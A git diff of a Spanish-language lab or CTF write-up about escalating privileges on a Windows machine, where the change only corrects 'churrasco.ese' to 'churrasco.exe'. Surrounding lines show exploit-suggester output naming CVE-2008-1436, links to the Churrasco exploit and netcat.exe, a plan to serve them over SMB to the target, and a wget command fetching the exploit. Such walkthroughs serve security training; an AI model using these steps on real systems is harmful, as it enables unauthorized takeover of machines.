@@ -101,7 +101,7 @@ C:\Documents and Settings>systeminfo
 python2 wes.py systeminfo.txt --exploits-only -i "Elevation of Privilege"
 ```
 
-Entre todas las vluns que encontramos podemos ver la **CVE-2008-1436** que utiliza el exploit [churrasco.ese](https://github.com/Re4son/Churrasco) para elevar privilegios.
+Entre todas las vluns que encontramos podemos ver la **CVE-2008-1436** que utiliza el exploit [churrasco.exe](https://github.com/Re4son/Churrasco) para elevar privilegios.
 
 ```txt
 Date: 20090414
@@ -115,7 +115,7 @@ Impact: Elevation of Privilege
 Exploit: https://www.exploit-db.com/exploits/6705
 ````
 
-Nos descargamos el [churrasco.ese](https://github.com/Re4son/Churrasco) y el [netcat.exe](https://github.com/int0x33/nc.exe) y los servimos con un servidor smb para poder pasarselos a la máquina windows.
+Nos descargamos el [churrasco.exe](https://github.com/Re4son/Churrasco) y el [netcat.exe](https://github.com/int0x33/nc.exe) y los servimos con un servidor smb para poder pasarselos a la máquina windows.
 
 ```bash
 wget https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
